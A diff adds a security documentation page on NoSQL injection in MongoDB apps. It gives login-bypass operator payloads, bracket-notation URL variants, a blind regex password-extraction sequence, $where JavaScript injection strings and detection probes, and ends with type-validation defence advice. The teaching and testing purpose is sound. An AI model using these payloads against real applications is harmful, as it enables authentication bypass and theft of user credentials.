@@ -1,0 +1,183 @@
+---
+title: NoSQL Injection
+description: Operator and JavaScript injection in MongoDB-backed applications.
+mitre: [T1190]
+d3fend: [D3-MH, D3-MA]
+impact: [AuthBypass, DataExfil]
+owasp: [A05]
+sidebar:
+  order: 10
+  label: NoSQL injection
+---
+import { Aside, Tabs, TabItem } from '@astrojs/starlight/components';
+
+<Aside type="note">
+This page is a known stub. It will be expanded with detailed payloads and case studies as more source material becomes available.
+</Aside>
+
+NoSQL databases (MongoDB most commonly) are not immune to injection. Two classes:
+
+1. **Operator injection** - submit MongoDB query operators (`$ne`, `$gt`, `$regex`) instead of literal values.
+2. **JavaScript injection** - abuse `$where` and `mapReduce` clauses that execute server-side JS.
+
+## TL;DR
+
+<Tabs>
+  <TabItem label="JSON body">
+    ```json
+    // Auth bypass via operator injection
+    {"username": "admin", "password": {"$ne": null}}
+    {"username": {"$ne": null}, "password": {"$ne": null}}
+
+    // Regex extraction
+    {"username": "admin", "password": {"$regex": "^a"}}
+
+    // JavaScript injection ($where)
+    {"$where": "this.password.length > 20"}
+    {"$where": "sleep(5000)"}
+    ```
+  </TabItem>
+  <TabItem label="URL parameters">
+    ```
+    # Express + qs library bracket notation
+    ?username=admin&password[$ne]=null
+    ?username[$ne]=&password[$ne]=
+    ?id[$gt]=0
+    ```
+  </TabItem>
+</Tabs>
+
+## When you're looking at NoSQL
+
+| Indicator |
+|---|
+| API accepts JSON bodies |
+| Backend is Node.js / Express / Mongoose / Meteor |
+| Errors mention `MongoError`, `BSON`, `$where` |
+| URL parameters with bracket notation work: `?id[$gt]=0` |
+| 27017 open on internal network scan |
+
+<Aside type="tip">
+If a login form returns identical errors for "wrong password" and "user not found", it's often Mongo with weak input handling.
+</Aside>
+
+## Operator injection
+
+MongoDB operators are JSON keys starting with `$`. When an Express app passes `req.body` straight into a query:
+
+```javascript
+db.users.findOne({ username: req.body.username, password: req.body.password })
+```
+
+A normal request:
+
+```json
+{"username": "admin", "password": "letmein"}
+```
+
+The exploit:
+
+```json
+{"username": "admin", "password": {"$ne": null}}
+```
+
+Mongo evaluates `password: {$ne: null}` as "password is not null" - true for any user. Result: logged in as `admin` without knowing the password.
+
+### Useful operators
+
+| Operator | Meaning | Use |
+|---|---|---|
+| `$ne` | Not equal | Bypass exact-match checks |
+| `$gt`, `$lt` | Greater/less than | Bypass numeric checks |
+| `$regex` | Regex match | Extract data char-by-char |
+| `$in` | In array | Match any of multiple values |
+| `$exists` | Field exists | Probe schema |
+| `$where` | Run JS | Arbitrary code execution |
+
+### URL-encoded operator injection
+
+Express with the `qs` query-string parser converts bracket notation into nested objects:
+
+```
+GET /search?username=admin&password[$ne]=foo
+```
+
+becomes:
+
+```javascript
+req.query = { username: "admin", password: { $ne: "foo" } }
+```
+
+If the app passes `req.query` to Mongo, this is operator injection without ever sending JSON. Test by changing any equality to bracket syntax:
+
+```
+?id=1               →  ?id[$ne]=0
+?username=admin     →  ?username[$ne]=
+```
+
+## Regex extraction (blind NoSQL)
+
+When you can't see output but can detect login success:
+
+```json
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^b"}}
+...
+{"username": "admin", "password": {"$regex": "^l"}}   // ← login succeeds
+{"username": "admin", "password": {"$regex": "^le"}}  // ← still succeeds
+{"username": "admin", "password": {"$regex": "^let"}}
+```
+
+Each successful login confirms one more character. Like boolean blind SQLi, but the oracle is a regex prefix match.
+
+Anchor with `^` for the start and `$` for the end. Use `.{N}` to test specific lengths.
+
+## JavaScript injection ($where)
+
+`$where` clauses evaluate JavaScript on the server:
+
+```json
+{"$where": "this.username == 'admin' && this.password.length > 20"}
+```
+
+Conditions evaluate against each document. If the app builds the `$where` string from input:
+
+```javascript
+db.users.find({$where: `this.username == '${req.body.username}'`})
+```
+
+Inject:
+
+```
+admin' || sleep(5000) || '
+admin' || this.password.match(/^a/) || '
+```
+
+<Aside type="caution">
+`$where` is deprecated and often disabled. When it's enabled, RCE is possible via the JS context (which historically could touch Node globals - depends on Mongo version).
+</Aside>
+
+## Detection probes
+
+```json
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"$where": "1==1"}
+{"username": "admin", "password": {"$regex": ".*"}}
+```
+
+If any returns success when normal credentials don't, it's NoSQL injection.
+
+## Tools
+
+- `NoSQLMap` - automated detection and exploitation of MongoDB injection.
+- `nosqli` (https://github.com/Charlie-belmer/nosqli) - modern NoSQL injection scanner.
+- Burp Suite + manual payloads - most flexible for unusual cases.
+
+## Notes
+
+- "Parameterised queries" is the SQL fix; for NoSQL, the equivalent is **type validation**: reject non-string values for fields that should be strings. Mongoose schema definitions enforce this when used.
+- This page covers MongoDB. CouchDB, Cassandra, Redis, and others have their own injection patterns - generally less common.
+- Operator injection requires that the backend deserialises user input into nested objects before the query. Apps that explicitly cast inputs to strings are not vulnerable.
+
+{/* STUB: expand with Mongoose-specific patterns, $where RCE in older versions, full extraction loops, and case studies */}
